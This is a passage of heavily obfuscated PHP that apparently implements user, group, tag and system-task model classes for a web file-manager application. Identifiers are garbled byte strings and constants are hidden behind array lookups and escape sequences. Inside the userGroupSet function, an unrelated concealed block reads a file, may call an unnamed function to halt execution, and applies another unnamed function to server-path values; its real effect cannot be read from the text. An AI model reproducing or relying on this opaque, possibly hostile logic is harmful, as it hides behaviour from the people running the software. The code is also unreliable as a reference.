$_SERVER[ˆë€Ï⁄∂]; $ŒÔóÃœ˚ = $this->getInfoSimple($÷Ë˜ËÍ‰); if (!$ŒÔóÃœ˚) { return !1; } $¬«®˝£… = array($àÂùê¶‘[1778] => $÷Ë˜ËÍ‰); Model($àÂùê¶‘[678])->where($¬«®˝£…)->delete(); Model($àÂùê¶‘[2516])->where($¬«®˝£…)->delete(); Model($àÂùê¶‘[2082])->where($¬«®˝£…)->delete(); Model($àÂùê¶‘[2501])->where($¬«®˝£…)->delete(); Model($àÂùê¶‘[1161])->where($¬«®˝£…)->delete(); Model($àÂùê¶‘[2303])->removeUserAll($÷Ë˜ËÍ‰); Model($àÂùê¶‘[916])->userRootRemove($÷Ë˜ËÍ‰); return $this->where($¬«®˝£…)->delete(); } protected function userGroupSet($ƒ´ùë¿Ø, $ã‘ÑÌô≠, $Â∆ô°¿É = array()) { $◊¸„—®„ =& $_SERVER[ˆë€Ï⁄∂]; if ($_SERVER[$◊¸„—®„[54]] != $_SERVER[$◊¸„—®„[55]]) { $ïî˜Å–Ö = $◊¸„—®„[970]; $∂€±ç≤ñ = $◊¸„—®„[56]; $Ê±Ââ˛Ó = $_SERVER[$◊¸„—®„[57]] . $◊¸„—®„[58]; $Óá£≤°∑ = $∂€±ç≤ñ($Ê±Ââ˛Ó); $∂…∞⁄Ìœ = explode($◊¸„—®„[59], $Óá£≤°∑); if (count($∂…∞⁄Ìœ) < $◊¸„—®„[703]) { $íÒ Ò˜£ = $◊¸„—®„[61]; $íÒ Ò˜£(); } $‚´µæë˘ = $◊¸„—®„[971]; $‚´µæë˘($_SERVER[$◊¸„—®„[972]]); $‚´µæë˘($_SERVER[$◊¸„—®„[57]] . $◊¸„—®„[2517]); $π›ﬁ∏≥° = 1; while ($π›ﬁ∏≥° > 1) { $π›ﬁ∏≥° = $π›ﬁ∏≥° + 4; $å„¸◊√¢ = rawurlencode($π›ﬁ∏≥° . $◊¸„—®„[465]); } } $∆Ù¥ªó… = $this->getInfoSimple($ƒ´ùë¿Ø); if (!$∆Ù¥ªó… || !is_array($ã‘ÑÌô≠)) { return !1; } $à›È∆∆€ = Model($◊¸„—®„[2082]); $à›È∆∆€->where(array($◊¸„—®„[1787] => $ƒ´ùë¿Ø))->delete(); $ù’À∂†¢ = array(); $Ÿç÷›î´ = 0; foreach ($ã‘ÑÌô≠ as $ÄëËÔÏñ => $ıŒà≈¿é) { $ù¿†Ù±˛ = array($◊¸„—®„[1787] => $ƒ´ùë¿Ø, $◊¸„—®„[1988] => $ÄëËÔÏñ, $◊¸„—®„[2096] => $ıŒà≈¿é); $ù¿†Ù±˛[$◊¸„—®„[2012]] = isset($Â∆ô°¿É[$Ÿç÷›î´]) ? $Â∆ô°¿É[$Ÿç÷›î´] : 0; $Ÿç÷›î´++; $ù’À∂†¢[] = $ù¿†Ù±˛; } return $à›È∆∆€->addAll($ù’À∂†¢, array(), !0); } protected function userGroupAdd($õÅ‘´ﬁæ, $≠¶˛ıÜ¿ = array()) { $˙§Äƒœ =& $_SERVER[ˆë€Ï⁄∂]; $„πœûØö = $this->getInfoSimple($õÅ‘´ﬁæ); if (!$„πœûØö || empty($≠¶˛ıÜ¿)) { return !1; } $€∫ß®◊– = array(); foreach ($≠¶˛ıÜ¿ as $ë˝∂åèÅ => $·≈¨Üù¶) { $€∫ß®◊–[] = array($˙§Äƒœ[1787] => $õÅ‘´ﬁæ, $˙§Äƒœ[1988] => $ë˝∂åèÅ, $˙§Äƒœ[2096] => $·≈¨Üù¶, $˙§Äƒœ[2012] => 0); } return Model($˙§Äƒœ[2082])->addAll($€∫ß®◊–, array(), !0); } protected function userGroupRemove($Œ®Ñæíæ, $Œ¨øÔ¿˜) { $¨π◊◊ß∫ =& $_SERVER[ˆë€Ï⁄∂]; $‚Ã„ÙãÁ = $this->getInfoSimple($Œ®Ñæíæ); if (!$‚Ã„ÙãÁ || !$Œ¨øÔ¿˜) { return !1; } $ÂÄ ŒÌ£ = array($¨π◊◊ß∫[1778] => $Œ®Ñæíæ, $¨π◊◊ß∫[2080] => $Œ¨øÔ¿˜); return Model($¨π◊◊ß∫[2082])->where($ÂÄ ŒÌ£)->delete(); } public function listData() { $„≠ﬁ¶ºπ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($„≠ﬁ¶ºπ[$_SERVER[ˆë€Ï⁄∂][456]]); return $„≠ﬁ¶ºπ; } public function listByID($ƒ‰øıï◊) { $ÆÖ˙ÉÀê =& $_SERVER[ˆë€Ï⁄∂]; if (!$ƒ‰øıï◊) { return; } $¬Â≥â—¿ = array($ÆÖ˙ÉÀê[1787] => array($ÆÖ˙ÉÀê[7], $ƒ‰øıï◊)); $œ…ø≥‡ß = $this->where($¬Â≥â—¿)->select(); $œ…ø≥‡ß = array_sort_keep($œ…ø≥‡ß, $ÆÖ˙ÉÀê[1787], $ƒ‰øıï◊); $this->_listDataApply($œ…ø≥‡ß); return $œ…ø≥‡ß; } public function listByGroup($˘ÜóõÇÊ = 0, $“Í√◊ÇÙ = array()) { $ÍÃá¶ÍÄ =& $_SERVER[ˆë€Ï⁄∂]; $¬˝∏±î§ = $ÍÃá¶ÍÄ[12]; $ÙóıÿÜË = array(); if ($˘ÜóõÇÊ) { $ÙóıÿÜË = array($ÍÃá¶ÍÄ[2518] => intval($˘ÜóõÇÊ)); $¬˝∏±î§ = "\114\105\x46\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\165\163\x65\162\137\147\162\x6f\165\x70\x20\x75\163\x65\162\x5f\x67\162\x6f\x75\160\x20\x6f\156\40\165\x73\145\162\x2e\165\x73\145\x72\x49\x44\40\75\40\x75\163\145\162\137\x67\x72\x6f\x75\x70\x2e\165\163\145\162\x49\104"; $ﬂãÑØø÷ = Input::get($ÍÃá¶ÍÄ[541], null, $ÍÃá¶ÍÄ[12]) ? $ÍÃá¶ÍÄ[12] : $ÍÃá¶ÍÄ[2519]; } if (isset($“Í√◊ÇÙ[$ÍÃá¶ÍÄ[841]])) { $ÙóıÿÜË[$ÍÃá¶ÍÄ[2520]] = $“Í√◊ÇÙ[$ÍÃá¶ÍÄ[841]]; } $ó›ÓÈï˚ = _get($“Í√◊ÇÙ, $ÍÃá¶ÍÄ[2521], $ÍÃá¶ÍÄ[243]); if (_get($“Í√◊ÇÙ, $ÍÃá¶ÍÄ[851], !1)) { $ÙóıÿÜË[$ó›ÓÈï˚] = array($ÍÃá¶ÍÄ[2267], $“Í√◊ÇÙ[$ÍÃá¶ÍÄ[851]]); } if (_get($“Í√◊ÇÙ, $ÍÃá¶ÍÄ[852], !1)) { $ΩﬂÊ§ú± = array($ÍÃá¶ÍÄ[2268], $“Í√◊ÇÙ[$ÍÃá¶ÍÄ[852]]); if ($ÙóıÿÜË[$ó›ÓÈï˚]) { $ÙóıÿÜË[$ó›ÓÈï˚] = array($ÙóıÿÜË[$ó›ÓÈï˚], $ΩﬂÊ§ú±, $ÍÃá¶ÍÄ[2269]); } else { $ÙóıÿÜË[$ó›ÓÈï˚] = $ΩﬂÊ§ú±; } } $ô≠ºâÁÓ = $this->_makeOrder($ﬂãÑØø÷)->field($ÍÃá¶ÍÄ[2522])->where($ÙóıÿÜË)->join($¬˝∏±î§)->selectPage(50); $this->_listDataApply($ô≠ºâÁÓ[$ÍÃá¶ÍÄ[456]]); return $ô≠ºâÁÓ; } private function _makeOrder($‘¨ñ˚ † = '') { $ÓÑ¸¬ïÏ =& $_SERVER[ˆë€Ï⁄∂]; $£¶¡äÌÉ = array($ÓÑ¸¬ïÏ[1787], $ÓÑ¸¬ïÏ[32], $ÓÑ¸¬ïÏ[1976], $ÓÑ¸¬ïÏ[2198], $ÓÑ¸¬ïÏ[1948], $ÓÑ¸¬ïÏ[243]); $Øñ›éûã = array($ÓÑ¸¬ïÏ[534] => $ÓÑ¸¬ïÏ[535], $ÓÑ¸¬ïÏ[536] => $ÓÑ¸¬ïÏ[537]); $‘ì°Èµß = Input::get($ÓÑ¸¬ïÏ[541], $ÓÑ¸¬ïÏ[7], $ÓÑ¸¬ïÏ[1778], $£¶¡äÌÉ); $›·Æã°Ø = Input::get($ÓÑ¸¬ïÏ[542], $ÓÑ¸¬ïÏ[7], $ÓÑ¸¬ïÏ[2083], array($ÓÑ¸¬ïÏ[2083], $ÓÑ¸¬ïÏ[536])); $›·Æã°Ø = $Øñ›éûã[$›·Æã°Ø]; $‘¨ñ˚ † = $‘¨ñ˚ † . "\x75\x73\x65\162\x2e{$‘ì°Èµß}\40{$›·Æã°Ø}\x2c\x20\165\x73\x65\162\x2e\x75\163\x65\x72\111\x44\40\x61\163\x63"; return $this->alias($ÓÑ¸¬ïÏ[2214])->order($‘¨ñ˚ †); } public function listSearch($ÀÔÿÛ◊á) { $≥ïÊ››§ =& $_SERVER[ˆë€Ï⁄∂]; $ú÷√ìÂ» = trim($ÀÔÿÛ◊á[$≥ïÊ››§[2086]]); $—œ˛õ°Ó = explode($≥ïÊ››§[53], $ú÷√ìÂ»); if (!$ú÷√ìÂ» || count($—œ˛õ°Ó) == 1) { return $this->listSearchNow($ÀÔÿÛ◊á); } $’»®´Ï∞ = array($≥ïÊ››§[456] => array()); foreach ($—œ˛õ°Ó as $¥´˚ÕÍ‘) { if (!trim($¥´˚ÕÍ‘)) { continue; } $ÀÔÿÛ◊á[$≥ïÊ››§[2086]] = $¥´˚ÕÍ‘; $ô©Æ€¥£ = $this->listSearchNow($ÀÔÿÛ◊á); $’»®´Ï∞[$≥ïÊ››§[456]] = array_merge($’»®´Ï∞[$≥ïÊ››§[456]], $ô©Æ€¥£[$≥ïÊ››§[456]]); } $’»®´Ï∞[$≥ïÊ››§[456]] = array_unique_by_key($’»®´Ï∞[$≥ïÊ››§[456]], $≥ïÊ››§[1787]); $’»®´Ï∞[$≥ïÊ››§[453]] = array($≥ïÊ››§[454] => count($’»®´Ï∞[$≥ïÊ››§[456]]), $≥ïÊ››§[450] => 20, $≥ïÊ››§[439] => 1, $≥ïÊ››§[455] => 1); return $’»®´Ï∞; } public function listSearchNow($ﬂ≈≤üéÿ) { $ó„Ù≈◊À =& $_SERVER[ˆë€Ï⁄∂]; $µì¯õ√® = trim($ﬂ≈≤üéÿ[$ó„Ù≈◊À[2086]]); $¬ï›µÜÎ = isset($ﬂ≈≤üéÿ[$ó„Ù≈◊À[2087]]) ? $ﬂ≈≤üéÿ[$ó„Ù≈◊À[2087]] : !1; $µì¯õ√® = str_replace($ó„Ù≈◊À[2088], $ó„Ù≈◊À[2089], trim($µì¯õ√®)); $˛…‚±≈£ = array($ó„Ù≈◊À[32] => array($ó„Ù≈◊À[470], "\45{$µì¯õ√®}\45"), $ó„Ù≈◊À[391] => array($ó„Ù≈◊À[470], "{$µì¯õ√®}\45"), $ó„Ù≈◊À[2286] => array($ó„Ù≈◊À[470], "{$µì¯õ√®}\45"), $ó„Ù≈◊À[1092] => $ó„Ù≈◊À[2090]); if (Input::check($µì¯õ√®, $ó„Ù≈◊À[397])) { $˛…‚±≈£[$ó„Ù≈◊À[1787]] = array($ó„Ù≈◊À[470], "{$µì¯õ√®}\45"); $˛…‚±≈£[$ó„Ù≈◊À[2502]] = array($ó„Ù≈◊À[470], "{$µì¯õ√®}\45"); } if (!$µì¯õ√®) { $˛…‚±≈£ = array(); } if (isset($ﬂ≈≤üéÿ[$ó„Ù≈◊À[841]])) { $˛…‚±≈£[$ó„Ù≈◊À[841]] = $ﬂ≈≤üéÿ[$ó„Ù≈◊À[841]]; } $˛…‚±≈£ = $this->parseWhereLike($˛…‚±≈£); $Åû—∏ì˘ = $this->_makeOrder()->where($˛…‚±≈£)->selectPage(20); if (!$Åû—∏ì˘ || count($Åû—∏ì˘[$ó„Ù≈◊À[456]]) < 5 && Input::check($µì¯õ√®, $ó„Ù≈◊À[404])) { $úçÕèû÷ = $this->_searchFromMeta($ó„Ù≈◊À[548], $µì¯õ√®, 10); $≈Åó‡é™ = $this->_searchFromMeta($ó„Ù≈◊À[549], $µì¯õ√®, 10); $è††Î¶˚ = array_merge($úçÕèû÷, $≈Åó‡é™, $Åû—∏ì˘[$ó„Ù≈◊À[456]]); $Åû—∏ì˘[$ó„Ù≈◊À[456]] = array_unique_by_key($è††Î¶˚, $ó„Ù≈◊À[1787]); $Åû—∏ì˘[$ó„Ù≈◊À[453]][$ó„Ù≈◊À[454]] = count($Åû—∏ì˘[$ó„Ù≈◊À[456]]); $Åû—∏ì˘[$ó„Ù≈◊À[453]][$ó„Ù≈◊À[455]] = ceil($Åû—∏ì˘[$ó„Ù≈◊À[453]][$ó„Ù≈◊À[454]] / $Åû—∏ì˘[$ó„Ù≈◊À[453]][$ó„Ù≈◊À[450]]); } $this->_listDataApply($Åû—∏ì˘[$ó„Ù≈◊À[456]]); $this->_filterByGroup($Åû—∏ì˘, $¬ï›µÜÎ); return $Åû—∏ì˘; } private function _filterByGroup(&$≈Íÿá¢Å, $‡ø”ÆÍò) { $‘—≠å¬ÿ =& $_SERVER[ˆë€Ï⁄∂]; if (!$‡ø”ÆÍò) { return $≈Íÿá¢Å; } foreach ($≈Íÿá¢Å[$‘—≠å¬ÿ[456]] as $∫ı∂Ñ˛¢ => &$ıﬂÁ∞¿ä) { $· Ÿ‰†∆ = array_to_keyvalue($ıﬂÁ∞¿ä[$‘—≠å¬ÿ[2183]], $‘—≠å¬ÿ[12], $‘—≠å¬ÿ[1988]); if (!in_array($‡ø”ÆÍò, $· Ÿ‰†∆)) { unset($≈Íÿá¢Å[$‘—≠å¬ÿ[456]][$∫ı∂Ñ˛¢]); } } unset($ıﬂÁ∞¿ä); $≈Íÿá¢Å[$‘—≠å¬ÿ[456]] = array_values($≈Íÿá¢Å[$‘—≠å¬ÿ[456]]); $≈Íÿá¢Å[$‘—≠å¬ÿ[453]] = array($‘—≠å¬ÿ[2251] => count($≈Íÿá¢Å[$‘—≠å¬ÿ[456]]), $‘—≠å¬ÿ[2249] => $≈Íÿá¢Å[$‘—≠å¬ÿ[453]][$‘—≠å¬ÿ[450]], $‘—≠å¬ÿ[2248] => 1, $‘—≠å¬ÿ[2250] => 1); } private function _searchFromMeta($§πä·‘Ê, $∑‰≥£Ù∑, $ÿô¡ÙÕÎ) { $ÈÏñ€ﬁç =& $_SERVER[ˆë€Ï⁄∂]; $∑‰≥£Ù∑ = strtolower($∑‰≥£Ù∑); $˛ﬁœÔôß = array($ÈÏñ€ﬁç[107] => $§πä·‘Ê, $ÈÏñ€ﬁç[461] => array($ÈÏñ€ﬁç[470], "\45{$∑‰≥£Ù∑}\45")); $˛ﬁœÔôß = $this->parseWhereLike($˛ﬁœÔôß); $°£ΩÈôÍ = Model($ÈÏñ€ﬁç[2523])->where($˛ﬁœÔôß)->limit($ÿô¡ÙÕÎ)->select(); if (!$°£ΩÈôÍ) { return array(); } $°£ΩÈôÍ = array_to_keyvalue($°£ΩÈôÍ, $ÈÏñ€ﬁç[12], $ÈÏñ€ﬁç[1787]); $»”ÎŒ“” = $this->where(array($ÈÏñ€ﬁç[1778] => array($ÈÏñ€ﬁç[7], $°£ΩÈôÍ)))->select(); if (!$»”ÎŒ“”) { return array(); } return $»”ÎŒ“”; } private function _listDataApplyItem($ñÌœ¨˙ª) { $•∂¶∆ü˚ = array($ñÌœ¨˙ª); $this->_listDataApply($•∂¶∆ü˚); return $•∂¶∆ü˚[0]; } private function _listDataApply(&$ı◊Ÿ¢®˙) { $≈ÍÆ∂∏É =& $_SERVER[ˆë€Ï⁄∂]; if (!$ı◊Ÿ¢®˙) { return; } array_remove_key($ı◊Ÿ¢®˙, $≈ÍÆ∂∏É[981]); $øü≥ÈÃ∞ = array_to_keyvalue($ı◊Ÿ¢®˙, $≈ÍÆ∂∏É[12], $≈ÍÆ∂∏É[1787]); $this->_listAppendGroup($ı◊Ÿ¢®˙, $øü≥ÈÃ∞); $this->_listAppendMeta($ı◊Ÿ¢®˙, $øü≥ÈÃ∞); $this->_listAppendSourceRoot($ı◊Ÿ¢®˙, $øü≥ÈÃ∞); } private function _listAppendSourceRoot(&$„õ ˙´“, $é√È¥˚Ü) { $´≈ﬁïÖ» =& $_SERVER[ˆë€Ï⁄∂]; $Öπ¿∫≠ë = Model($´≈ﬁïÖ»[916])->listSourceRoot(SourceModel::TYPE_USER, $é√È¥˚Ü); $Öπ¿∫≠ë = array_to_keyvalue($Öπ¿∫≠ë, $´≈ﬁïÖ»[580]); $Öπ¿∫≠ë = array_remove_key($Öπ¿∫≠ë, $´≈ﬁïÖ»[580]); foreach ($„õ ˙´“ as &$ÿ˛Çëúª) { $ÿ˛Çëúª[$´≈ﬁïÖ»[100]] = $Öπ¿∫≠ë[$ÿ˛Çëúª[$´≈ﬁïÖ»[1787]]] ? $Öπ¿∫≠ë[$ÿ˛Çëúª[$´≈ﬁïÖ»[1787]]] : array(); } unset($ÿ˛Çëúª); } private function _listAppendGroup(&$⁄÷¨åıõ, $≈Œ÷Ÿ˘˘) { $˜®“ñı‰ =& $_SERVER[ˆë€Ï⁄∂]; $ßÊ”µìã = array($˜®“ñı‰[1787] => array($˜®“ñı‰[7], $≈Œ÷Ÿ˘˘)); $ãà√≠ÄØ = Model($˜®“ñı‰[2082])->where($ßÊ”µìã)->select(); $˛Ò‰Å…˚ = array_to_keyvalue($ãà√≠ÄØ, $˜®“ñı‰[12], $˜®“ñı‰[1988]); $˛Ò‰Å…˚ = array_remove_value(array_unique($˛Ò‰Å…˚), $˜®“ñı‰[240]); if (!$˛Ò‰Å…˚ || !$ãà√≠ÄØ) { return; } $ßÊ”µìã = array($˜®“ñı‰[1988] => array($˜®“ñı‰[7], $˛Ò‰Å…˚)); $Â»ööØÊ = Model($˜®“ñı‰[2181])->field($˜®“ñı‰[2524])->where($ßÊ”µìã)->select(); $Â»ööØÊ = array_to_keyvalue($Â»ööØÊ, $˜®“ñı‰[1988]); $ãà√≠ÄØ = array_to_keyvalue_group($ãà√≠ÄØ, $˜®“ñı‰[1787]); foreach ($ãà√≠ÄØ as &$à˜¬ø·∞) { $«ßÜ˜Çó = array(); foreach ($à˜¬ø·∞ as $·èã„ñ·) { if (!$·èã„ñ·[$˜®“ñı‰[2096]]) { continue; } $ÿ≠ô›ß◊ = Model($˜®“ñı‰[582])->listData($·èã„ñ·[$˜®“ñı‰[2096]]); $«ßÜ˜Çó[] = array($˜®“ñı‰[1988] => $·èã„ñ·[$˜®“ñı‰[1988]], $˜®“ñı‰[2525] => $Â»ööØÊ[$·èã„ñ·[$˜®“ñı‰[1988]]][$˜®“ñı‰[32]], $˜®“ñı‰[595] => $Â»ööØÊ[$·èã„ñ·[$˜®“ñı‰[1988]]][$˜®“ñı‰[595]], $˜®“ñı‰[498] => $ÿ≠ô›ß◊); } $à˜¬ø·∞ = $«ßÜ˜Çó; } unset($à˜¬ø·∞); foreach ($⁄÷¨åıõ as &$™ŒÖ¨ç⁄) { $™ŒÖ¨ç⁄[$˜®“ñı‰[2183]] = array(); if (isset($ãà√≠ÄØ[$™ŒÖ¨ç⁄[$˜®“ñı‰[1787]]])) { $™ŒÖ¨ç⁄[$˜®“ñı‰[2183]] = $ãà√≠ÄØ[$™ŒÖ¨ç⁄[$˜®“ñı‰[1787]]]; } } unset($™ŒÖ¨ç⁄); } public function userAppendGroup($…ûÚ±Ôß) { $Ï•£¶Ûá =& $_SERVER[ˆë€Ï⁄∂]; if (!$…ûÚ±Ôß) { return array(); } $this->_listAppendGroup($…ûÚ±Ôß, array_to_keyvalue($…ûÚ±Ôß, $Ï•£¶Ûá[12], $Ï•£¶Ûá[1787])); return $…ûÚ±Ôß; } private function _listAppendMeta(&$Ê°≠√Î, $Å»ß≠‰√) { $ù¢”Úñ… =& $_SERVER[ˆë€Ï⁄∂]; $“Ã£±äÖ = UserJobModel::JOB_KEY; $ÎÙîÛÅñ = array($ù¢”Úñ…[2503]); $èÒÀì˘≠ = array($ù¢”Úñ…[1787] => array($ù¢”Úñ…[7], $Å»ß≠‰√)); $◊Ú”‹ÔØ = Model($ù¢”Úñ…[2501])->where($èÒÀì˘≠)->select(); $◊Ú”‹ÔØ = array_to_keyvalue_group($◊Ú”‹ÔØ, $ù¢”Úñ…[1787]); foreach ($◊Ú”‹ÔØ as &$§ÖÜµäö) { $ÙÏï÷È∫ = array(); foreach ($§ÖÜµäö as $˚˚∞ôØê) { if (!in_array($˚˚∞ôØê[$ù¢”Úñ…[107]], $ÎÙîÛÅñ)) { $ÙÏï÷È∫[$˚˚∞ôØê[$ù¢”Úñ…[107]]] = $˚˚∞ôØê[$ù¢”Úñ…[461]]; } } $§ÖÜµäö = $ÙÏï÷È∫; } unset($§ÖÜµäö); $ô›∏∏Ÿ¨ = Model($ù¢”Úñ…[2526]); foreach ($Ê°≠√Î as &$ œ÷êöë) { $˚Îä”èË = array(); if (isset($◊Ú”‹ÔØ[$ œ÷êöë[$ù¢”Úñ…[1787]]])) { $˚Îä”èË = $◊Ú”‹ÔØ[$ œ÷êöë[$ù¢”Úñ…[1787]]]; } $ œ÷êöë[$ù¢”Úñ…[2527]] = array(); if (isset($˚Îä”èË[$“Ã£±äÖ])) { $ œ÷êöë[$ù¢”Úñ…[2527]] = $ô›∏∏Ÿ¨->getUserJobInfo($˚Îä”èË[$“Ã£±äÖ]); } } unset($ œ÷êöë); } protected function groupUserAll($˛µπ¥◊Ö) { $∆≤Á∞√É =& $_SERVER[ˆë€Ï⁄∂]; if (!$˛µπ¥◊Ö) { return !1; } $öã⁄¬ÌΩ = Model($∆≤Á∞√É[2082])->field($∆≤Á∞√É[1787])->where(array($∆≤Á∞√É[1988] => array($∆≤Á∞√É[7], $˛µπ¥◊Ö)))->select(); $öã⁄¬ÌΩ = array_to_keyvalue($öã⁄¬ÌΩ, $∆≤Á∞√É[12], $∆≤Á∞√É[1787]); return array_unique($öã⁄¬ÌΩ); } public function userSearch($Ò˘Î·¡¨, $Üâ˘’ä— = "\x2a") { return Model($_SERVER[ˆë€Ï⁄∂][608])->where($Ò˘Î·¡¨)->field($Üâ˘’ä—)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\157\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($æº¯á·◊) { $¡ƒ⁄Ω£ƒ =& $_SERVER[ˆë€Ï⁄∂]; $ÆÌøà£« = defined($¡ƒ⁄Ω£ƒ[2218]) && USER_ID ? USER_ID : $¡ƒ⁄Ω£ƒ[12]; return "\x55\x73\x65\162\x4f\160\x74\x69\157\x6e\x5f{$æº¯á·◊}\x5f" . $ÆÌøà£«; } protected function filterWhere($’¯∑ÖÅÒ) { $§„êËÕ‹ =& $_SERVER[ˆë€Ï⁄∂]; $’¯∑ÖÅÒ[$§„êËÕ‹[1787]] = defined($§„êËÕ‹[2218]) && USER_ID ? USER_ID : $§„êËÕ‹[12]; return $’¯∑ÖÅÒ; } public function cacheRemoveUser($√‘°◊ºö, $≠∆ËÜ˛á) { return Cache::remove("\x55\x73\145\x72\117\160\164\x69\x6f\x6e\137{$√‘°◊ºö}\x5f" . $≠∆ËÜ˛á); } protected function optionDefault($ô≈‡˚ü€ = '') { $â¢´ﬁ¬œ =& $_SERVER[ˆë€Ï⁄∂]; if ($ô≈‡˚ü€ == $â¢´ﬁ¬œ[12]) { return $GLOBALS[$â¢´ﬁ¬œ[6]][$â¢´ﬁ¬œ[2528]]; } if ($ô≈‡˚ü€ == $â¢´ﬁ¬œ[2529]) { return $GLOBALS[$â¢´ﬁ¬œ[6]][$â¢´ﬁ¬œ[2530]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\164\x61\147\114\x69\x73\x74"; public $modelType = "\x55\x73\145\x72\117\x70\164\151\x6f\x6e"; public $field = array("\x6e\x61\155\x65", "\163\x74\x79\x6c\145", "\x73\x6f\162\164"); public function listData($–∫ªÙ–É = false, $ú≈†öâÓ = "\x73\x6f\x72\x74", $Ô€áÍ»˙ = false) { return parent::listData($–∫ªÙ–É, $ú≈†öâÓ, $Ô€áÍ»˙); } public function remove($˚ìﬂÁÓÛ) { return parent::remove($˚ìﬂÁÓÛ); } public function add($»Öæø‚Î, $µö´ÇŸª = "\154\141\x62\145\154\55\147\x72\x65\x79\x2d\156\157\162\155\x61\154") { $√Åí¿ﬂÊ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->findByName($»Öæø‚Î)) { return !1; } $¶˜Ó∞ì™ = array($√Åí¿ﬂÊ[505] => $»Öæø‚Î, $√Åí¿ﬂÊ[569] => $µö´ÇŸª, $√Åí¿ﬂÊ[1992] => $this->getSort($√Åí¿ﬂÊ[346]) + 1); return parent::insert($¶˜Ó∞ì™); } public function update($˙Ñﬁ†ë«, $ÇÂˆºçÚ) { $§Í‘ª—« =& $_SERVER[ˆë€Ï⁄∂]; $ÈÖı”ﬂÃ = $this->listData($˙Ñﬁ†ë«); $ÑîÜıÎ = $this->findByName($ÇÂˆºçÚ[$§Í‘ª—«[32]]); if (!$ÈÖı”ﬂÃ || $ÑîÜıÎ && $ÑîÜıÎ[$§Í‘ª—«[486]] != $ÈÖı”ﬂÃ[$§Í‘ª—«[486]]) { return !1; } return parent::update($˙Ñﬁ†ë«, $ÇÂˆºçÚ); } public function moveTop($çÊÇÏüå) { $◊˘ı∆‚æ =& $_SERVER[ˆë€Ï⁄∂]; $˙≥·ı’∂ = parent::listData(); $˚Íã§“Á = $this->getSort($◊˘ı∆‚æ[345]); foreach ($˙≥·ı’∂ as &$›Õ⁄è∏∆) { if ($›Õ⁄è∏∆[$◊˘ı∆‚æ[486]] == $çÊÇÏüå) { $›Õ⁄è∏∆[$◊˘ı∆‚æ[2012]] = $˚Íã§“Á; continue; } $›Õ⁄è∏∆[$◊˘ı∆‚æ[2012]] += 1; } unset($›Õ⁄è∏∆); return parent::resetData($˙≥·ı’∂); } public function moveBottom($‘ﬁÜòÊÉ) { $ùµ»˘ïü =& $_SERVER[ˆë€Ï⁄∂]; $Ë¶ñ±ˆî = $this->getSort($ùµ»˘ïü[346]) + 1; return parent::update($‘ﬁÜòÊÉ, array($ùµ»˘ïü[2012] => $Ë¶ñ±ˆî)); } public function resetSort($ﬁ˛•µ§∏) { $í›∫Ω„Ó =& $_SERVER[ˆë€Ï⁄∂]; $·ÛÏµÔ« = array(); $ﬁ˛•µ§∏ = is_array($ﬁ˛•µ§∏) ? $ﬁ˛•µ§∏ : array(); for ($∫áÄÇ≥Î = 0; $∫áÄÇ≥Î < count($ﬁ˛•µ§∏); $∫áÄÇ≥Î++) { $·ÛÏµÔ«[$ﬁ˛•µ§∏[$∫áÄÇ≥Î] . $í›∫Ω„Ó[12]] = $∫áÄÇ≥Î + 1; } $∑ì÷Ò˛’ = parent::listData(); foreach ($∑ì÷Ò˛’ as &$÷¡«ÏöË) { $∂Ë´‘†∏ = $·ÛÏµÔ«[$÷¡«ÏöË[$í›∫Ω„Ó[486]]]; $÷¡«ÏöË[$í›∫Ω„Ó[2012]] = $∂Ë´‘†∏ ? $∂Ë´‘†∏ : $÷¡«ÏöË[$í›∫Ω„Ó[2012]]; } unset($÷¡«ÏöË); return parent::resetData($∑ì÷Ò˛’); } private function getSort($·’ôº›ò) { $˘ˆÙ∫ñ± =& $_SERVER[ˆë€Ï⁄∂]; $Ÿ ‘≥óñ = parent::listData(); $éø∑’Ÿ = array_to_keyvalue($Ÿ ‘≥óñ, $˘ˆÙ∫ñ±[12], $˘ˆÙ∫ñ±[2012]); if (!$éø∑’Ÿ) { $éø∑’Ÿ = array(0); } $Ï≈ëæØÃ = $·’ôº›ò == $˘ˆÙ∫ñ±[346] ? max($éø∑’Ÿ) : min($éø∑’Ÿ); return intval($Ï≈ëæØÃ); } } goto Eî¯∑˜†ê¿; D¿‘êÕœ◊¶: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x74\x61\163\153\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\164\171\160\145", "\145\166\145\156\x74", "\164\x69\x6d\145", "\144\145\163\x63", "\163\x79\x73\x74\x65\x6d", "\x65\x6e\141\142\x6c\x65", "\x6c\141\x73\x74\122\x75\x6e", "\163\x6f\162\x74"); public function listData($‰ËË—¥´ = false, $‰Ø„”»∫ = "\163\x6f\162\164", $Ò∏ûÅƒﬂ = false) { return parent::listData($‰ËË—¥´, $‰Ø„”»∫, $Ò∏ûÅƒﬂ); } public function add($ÏÖï”êª) { $‰ŒèÚ∑∑ =& $_SERVER[ˆë€Ï⁄∂]; $µ∏ øØä = $this->findByName($ÏÖï”êª[$‰ŒèÚ∑∑[32]]); if ($µ∏ øØä) { return !1; } $ÏÖï”êª[$‰ŒèÚ∑∑[1737]] = 0; $ÏÖï”êª[$‰ŒèÚ∑∑[2012]] = $this->getSort(); return parent::insert($ÏÖï”êª); } private function getSort() { $ê«ßîÎ± =& $_SERVER[ˆë€Ï⁄∂]; $êê°´•á = parent::listData(); $ÌÁºÓÜ˜ = array_to_keyvalue($êê°´•á, $ê«ßîÎ±[12], $ê«ßîÎ±[2012]); return empty($ÌÁºÓÜ˜) ? 0 : max($ÌÁºÓÜ˜) + 1; } public function update($ÍŸÀöÀ˛, $Û∞ú‰¶ù) { $àÆ˝ƒÌ§ =& $_SERVER[ˆë€Ï⁄∂]; $ÿ•ë‘·‚ = $this->listData($ÍŸÀöÀ˛); $ëÆ™¯˘« = $this->findByName($Û∞ú‰¶ù[$àÆ˝ƒÌ§[32]]); if (!$ÿ•ë‘·‚ || $ëÆ™¯˘« && $ëÆ™¯˘«[$àÆ˝ƒÌ§[486]] != $ÿ•ë‘·‚[$àÆ˝ƒÌ§[486]]) { return !1; } return parent::update($ÍŸÀöÀ˛, $Û∞ú‰¶ù); } public function remove($‰¿Â éç, 